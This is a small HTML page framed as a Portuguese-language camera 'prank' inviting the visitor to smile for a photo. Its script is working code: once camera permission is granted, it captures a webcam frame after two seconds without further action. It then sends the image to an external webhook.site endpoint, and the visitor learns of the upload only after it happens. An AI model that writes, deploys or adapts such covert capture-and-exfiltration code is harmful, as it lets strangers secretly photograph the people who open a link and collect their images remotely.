<!DOCTYPE html>
<html>
<head>
  <title>Brincadeira com a CÃ¢mera</title>
</head>
<body>
  <h1>Sorria pra foto! ğŸ˜„</h1>
  <video id="video" width="640" height="480" autoplay></video>
  <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;

        video.onloadedmetadata = () => {
          setTimeout(() => {
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/png');

            // Mostra no console
            console.log("Imagem em Base64:", imageData);

            // Envia para um endpoint externo
            fetch("https://webhook.site/b9b2471d-d0c0-490a-9371-46aa5ad18565", {
              method: "POST",
              headers: {
                "Content-Type": "application/json"
              },
              body: JSON.stringify({ image: imageData })
            })
            .then(response => {
              alert("Foto enviada com sucesso!");
            })
            .catch(error => {
              alert("Erro ao enviar a foto.");
              console.error(error);
            });

          }, 2000); // espera 2 segundos
        };
      })
      .catch(error => {
        alert('PermissÃ£o negada ou erro ao acessar a cÃ¢mera.');
      });
  </script>
</body>
</html>
